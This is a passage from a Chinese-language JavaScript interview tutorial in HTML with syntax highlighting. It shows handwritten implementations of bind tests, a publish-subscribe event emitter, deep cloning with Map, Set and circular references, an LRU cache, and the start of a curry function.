  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'普通函数 this：'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 普通函数this指向绑定bind的第一个参数 也就是例子中的obj</span>
<span class="token punctuation">}</span>


<span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'poetries'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">18</span>
<span class="token punctuation">}</span>

<span class="token comment">// 先测试作为构造函数调用</span>
<span class="token keyword">var</span> bindFun <span class="token operator">=</span> Person<span class="token punctuation">.</span><span class="token function">myBind</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">'poetry1'</span><span class="token punctuation">)</span> <span class="token comment">// undefined</span>
<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">bindFun</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment">// Person name: poetry1、Person age: 10、Person this: fBound {}</span>
a<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// person say</span>

<span class="token comment">// 再测试作为普通函数调用</span>
<span class="token keyword">var</span> bindNormalFun <span class="token operator">=</span> normalFun<span class="token punctuation">.</span><span class="token function">myBind</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">'poetry2'</span><span class="token punctuation">)</span> <span class="token comment">// undefined</span>
<span class="token function">bindNormalFun</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span> 
<span class="token comment">// 普通函数name: poetry2 </span>
<span class="token comment">// 普通函数 age: 12 </span>
<span class="token comment">// 普通函数 this: {name: 'poetries', age: 18}</span>
</code></pre></div><blockquote><p><strong>注意</strong>： <code>bind</code>之后不能再次修改<code>this</code>的指向（箭头函数的底层实现原理依赖<code>bind</code>绑定this后不能再次修改<code>this</code>的特性），<code>bind</code>多次后执行，函数<code>this</code>还是指向第一次<code>bind</code>的对象</p></blockquote> <h3 id="发布订阅模式"><a href="#发布订阅模式" class="header-anchor">#</a> 发布订阅模式</h3> <p><strong>简介：</strong></p> <p>发布订阅者模式，一种对象间一对多的依赖关系，但一个对象的状态发生改变时，所依赖它的对象都将得到状态改变的通知。</p> <p><strong>主要的作用(优点)：</strong></p> <ol><li>广泛应用于异步编程中(替代了传递回调函数)</li> <li>对象之间松散耦合的编写代码</li></ol> <p><strong>缺点：</strong></p> <ul><li>创建订阅者本身要消耗一定的时间和内存</li> <li>多个发布者和订阅者嵌套一起的时候，程序难以跟踪维护</li></ul> <p><strong>实现的思路：</strong></p> <ul><li>创建一个对象(缓存列表)</li> <li><code>on</code>方法用来把回调函数<code>fn</code>都加到缓存列表中</li> <li><code>emit</code> 根据<code>key</code>值去执行对应缓存列表中的函数</li> <li><code>off</code>方法可以根据<code>key</code>值取消订阅</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">class</span> <span class="token class-name">EventEmiter</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 事件对象，存放订阅的名字和事件</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_events <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token comment">// 订阅事件的方法</span>
  <span class="token function">on</span><span class="token punctuation">(</span><span class="token parameter">eventName<span class="token punctuation">,</span>callback</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>_events<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>_events <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// 合并之前订阅的cb</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_events<span class="token punctuation">[</span>eventName<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_events<span class="token punctuation">[</span>eventName<span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>callback<span class="token punctuation">]</span>
  <span class="token punctuation">}</span>
  <span class="token comment">// 触发事件的方法</span>
  <span class="token function">emit</span><span class="token punctuation">(</span><span class="token parameter">eventName<span class="token punctuation">,</span> <span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>_events<span class="token punctuation">[</span>eventName<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// 遍历执行所有订阅的事件</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_events<span class="token punctuation">[</span>eventName<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">fn</span><span class="token operator">=&gt;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  <span class="token function">off</span><span class="token punctuation">(</span><span class="token parameter">eventName<span class="token punctuation">,</span>cb</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>_events<span class="token punctuation">[</span>eventName<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// 删除订阅的事件</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_events<span class="token punctuation">[</span>eventName<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_events<span class="token punctuation">[</span>eventName<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">fn</span><span class="token operator">=&gt;</span>fn <span class="token operator">!=</span> cb <span class="token operator">&amp;&amp;</span> fn<span class="token punctuation">.</span>l <span class="token operator">!=</span> cb<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  <span class="token comment">// 绑定一次 触发后将绑定的移除掉 再次触发掉</span>
  <span class="token function">once</span><span class="token punctuation">(</span><span class="token parameter">eventName<span class="token punctuation">,</span>callback</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token function-variable function">one</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
      <span class="token comment">// 等callback执行完毕在删除</span>
      <span class="token function">callback</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">off</span><span class="token punctuation">(</span>eventName<span class="token punctuation">,</span>one<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    one<span class="token punctuation">.</span>l <span class="token operator">=</span> callback <span class="token comment">// 自定义属性</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span>eventName<span class="token punctuation">,</span>one<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>测试用例</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">let</span> event <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventEmiter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">let</span> <span class="token function-variable function">login1</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'login success1'</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> <span class="token function-variable function">login2</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'login success2'</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token comment">// event.on('login',login1)</span>
event<span class="token punctuation">.</span><span class="token function">once</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">,</span>login2<span class="token punctuation">)</span>
event<span class="token punctuation">.</span><span class="token function">off</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">,</span>login1<span class="token punctuation">)</span> <span class="token comment">// 解除订阅</span>
event<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
event<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span>
event<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span>  
</code></pre></div><p><strong>发布订阅者模式和观察者模式的区别？</strong></p> <ul><li>发布/订阅模式是观察者模式的一种变形，两者区别在于，<strong>发布/订阅模式在观察者模式的基础上，在目标和观察者之间增加一个调度中心。</strong></li> <li><strong>观察者模式</strong>是由具体目标调度，比如当事件触发，<code>Subject</code> 就会去调用观察者的方法，所以观察者模式的订阅者与发布者之间是存在依赖的。</li> <li><strong>发布/订阅模式</strong>由统一调度中心调用，因此发布者和订阅者不需要知道对方的存在。</li></ul> <h3 id="手写js深拷贝-考虑各种数据类型和循环引用"><a href="#手写js深拷贝-考虑各种数据类型和循环引用" class="header-anchor">#</a> 手写JS深拷贝-考虑各种数据类型和循环引用</h3> <ul><li><strong>使用JSON.stringify</strong> <ul><li>无法转换函数</li> <li>无法转换<code>Map</code>和<code>Set</code></li> <li>无法转换循环引用</li></ul></li> <li><strong>普通深拷贝</strong> <ul><li>只考虑<code>Object</code>和<code>Array</code></li> <li>无法转换<code>Map</code>、<code>Set</code>和循环引用</li> <li>只能应对初级要求的技术一面</li></ul></li></ul> <p><strong>普通深拷贝 - 只考虑了简单的数组、对象</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * 普通深拷贝 - 只考虑了简单的数组、对象
 * @param obj obj
 */</span>
<span class="token keyword">function</span> <span class="token function">cloneDeep</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> obj <span class="token operator">!==</span> <span class="token string">'object'</span> <span class="token operator">||</span> obj <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> obj

    <span class="token keyword">let</span> result
    <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token keyword">instanceof</span> <span class="token class-name">Array</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        result <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            
            result<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">cloneDeep</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">// 递归调用</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> result
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 功能测试</span>
<span class="token keyword">const</span> <span class="token literal-property property">a</span><span class="token operator">:</span> any <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">set</span><span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token literal-property property">map</span><span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
a<span class="token punctuation">.</span>self <span class="token operator">=</span> a
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token function">cloneDeep</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// 无法处理 Map Set 和循环引用</span>
</code></pre></div><p><strong>深拷贝-考虑数组、对象、Map、Set、循环引用</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * 深拷贝
 * @param obj obj
 * @param map weakmap 为了避免循环引用、避免导致内存泄露的风险
 */</span>
<span class="token keyword">function</span> <span class="token function">cloneDeep</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WeakMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> obj <span class="token operator">!==</span> <span class="token string">'object'</span> <span class="token operator">||</span> obj <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> obj

    <span class="token comment">// 避免循环引用</span>
    <span class="token keyword">const</span> objFromMap <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>objFromMap<span class="token punctuation">)</span> <span class="token keyword">return</span> objFromMap

    <span class="token keyword">let</span> target <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    map<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> target<span class="token punctuation">)</span>

    <span class="token comment">// Map</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token keyword">instanceof</span> <span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        target <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        obj<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">v<span class="token punctuation">,</span> k</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">const</span> v1 <span class="token operator">=</span> <span class="token function">cloneDeep</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> map<span class="token punctuation">)</span>
            <span class="token keyword">const</span> k1 <span class="token operator">=</span> <span class="token function">cloneDeep</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> map<span class="token punctuation">)</span>
            target<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>k1<span class="token punctuation">,</span> v1<span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Set</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token keyword">instanceof</span> <span class="token class-name">Set</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        target <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        obj<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">v</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">const</span> v1 <span class="token operator">=</span> <span class="token function">cloneDeep</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> map<span class="token punctuation">)</span>
            target<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Array</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token keyword">instanceof</span> <span class="token class-name">Array</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        target <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=&gt;</span> <span class="token function">cloneDeep</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> map<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Object</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> val <span class="token operator">=</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
        <span class="token keyword">const</span> val1 <span class="token operator">=</span> <span class="token function">cloneDeep</span><span class="token punctuation">(</span>val<span class="token punctuation">,</span> map<span class="token punctuation">)</span>
        target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> val1
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> target
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 功能测试</span>
<span class="token keyword">const</span> <span class="token literal-property property">a</span><span class="token operator">:</span> any <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">set</span><span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token literal-property property">map</span><span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token literal-property property">info</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">city</span><span class="token operator">:</span> <span class="token string">'shenzhen'</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function-variable function">fn</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
a<span class="token punctuation">.</span>self <span class="token operator">=</span> a
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token function">cloneDeep</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token punctuation">)</span>
</code></pre></div><h3 id="用js实现一个lru缓存"><a href="#用js实现一个lru缓存" class="header-anchor">#</a> 用JS实现一个LRU缓存</h3> <ul><li><strong>什么是LRU缓存</strong> <ul><li><code>LRU（Least Recently Used）</code> 最近最少使用</li> <li>假如我们有一块内存，专门用来缓存我们最近发访问的网页，访问一个新网页，我们就会往内存中添加一个网页地址，随着网页的不断增加，内存存满了，这个时候我们就需要考虑删除一些网页了。这个时候我们找到内存中最早访问的那个网页地址，然后把它删掉。这一整个过程就可以称之为 <code>LRU</code> 算法</li> <li>核心两个<code>API</code>，<code>get</code>和<code>set</code></li></ul></li> <li><strong>分析</strong> <ul><li>用哈希表存储数据，这样<code>get</code> <code>set</code>才够快，时间复杂度<code>O(1)</code></li> <li>必须是有序的，常用数据放在前面，沉水数据放在后面</li> <li>哈希表 + 有序，就是<code>Map</code></li></ul></li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">class</span> <span class="token class-name">LRUCache</span> <span class="token punctuation">{</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">length</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>length <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'invalid length'</span><span class="token punctuation">)</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>length <span class="token operator">=</span> length
    <span class="token punctuation">}</span>

    <span class="token function">set</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>data

        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            data<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        data<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>size <span class="token operator">&gt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 如果超出了容量，则删除 Map 最老的元素</span>
            <span class="token keyword">const</span> delKey <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value
            data<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>delKey<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>data

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>data<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span>

        <span class="token keyword">const</span> value <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>

        <span class="token comment">// 先删除，再添加，就是最新的了</span>
        data<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
        data<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>

        <span class="token keyword">return</span> value
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 测试</span>

<span class="token keyword">const</span> lruCache <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LRUCache</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
lruCache<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">// {1=1}</span>
lruCache<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">// {1=1, 2=2}</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>lruCache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 1 {2=2, 1=1}</span>
lruCache<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment">// {1=1, 3=3}</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>lruCache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// null</span>
lruCache<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment">// {3=3, 4=4}</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>lruCache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// null</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>lruCache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 3 {4=4, 3=3}</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>lruCache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 4 {3=3, 4=4}</span>
</code></pre></div><h3 id="手写curry函数-实现函数柯里化"><a href="#手写curry函数-实现函数柯里化" class="header-anchor">#</a> 手写curry函数，实现函数柯里化</h3> <p><strong>分析</strong></p> <ul><li><code>curry</code>返回的是一个函数<code>fn</code></li> <li>执行<code>fn</code>，中间状态返回函数，如<code>add(1)</code>或者<code>add(1)(2)</code></li> <li>最后返回执行结果，如<code>add(1)(2)(3)</code></li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 实现函数柯里化</span>

<span class="token keyword">function</span> <span class="token function">curry</span><span class="token punctuation">(</span><span class="token parameter">fn</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> fnArgsLength <span class="token operator">=</span> fn<span class="token punctuation">.</span>length <span class="token comment">// 传入函数的参数长度</span>
    <span class="token keyword">let</span> args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

    <span class="token keyword">function</span> <span class="token function">calc</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>newArgs</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 积累参数保存到闭包中</span>
        args <span class="token operator">=</span> <span class="token punctuation">[</span>
            <span class="token operator">...</span>args<span class="token punctuation">,</span>
            <span class="token operator">...</span>newArgs
        <span class="token punctuation">]</span>
        <span class="token comment">// 积累的参数长度跟传入函数的参数长度对比</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> fnArgsLength<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 参数不够，返回函数</span>
